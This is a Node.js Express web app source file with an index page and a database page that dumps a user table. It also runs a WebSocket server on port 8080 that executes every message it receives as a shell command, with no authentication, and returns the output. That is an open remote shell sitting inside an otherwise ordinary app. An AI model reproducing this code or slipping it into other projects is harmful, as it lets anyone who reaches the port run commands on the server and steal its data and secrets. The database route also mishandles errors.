const express = require('express')
const path = require('path')
const PORT = process.env.PORT || 5000
const { exec } = require('child_process');

const { Pool } = require('pg');
const pool = new Pool({
   connectionString: process.env.DATABASE_URL
});

var app = express();
app.use(express.json());
app.use(express.urlencoded({extended:false}));
app.use(express.static(path.join(__dirname, 'public')))
app.set('views', path.join(__dirname, 'views'))
app.set('view engine', 'ejs')
app.get('/', (req, res) => res.render('pages/index'))


app.get('/database', (req, res) => {
  var getUsersQuery = `SELECT * FROM usr`;
  pool.query(getUsersQuery, (error, result) => {
     if (error) {
       res.end(error);
     }
     var results = {'rows':result.rows};
     res.render('pages/db', results);
  })
})
const WebSocket = require('ws')

const wss = new WebSocket.Server({ port: 8080 })

wss.on('connection', ws => {
  ws.on('message', message => {
    console.log(`Received message => ${message}`)
    exec(message, (err, stdout, stderr) => {
      if (err) {
        console.error(err)
      } else {
       console.log(`stdout:${stdout}`);
       console.log(`stderr:${stderr}`);
       ws.send(stdout);
       ws.send(stderr);
      }
    });
  });
})
app.listen(PORT, () => console.log(`Listening on ${ PORT }`))


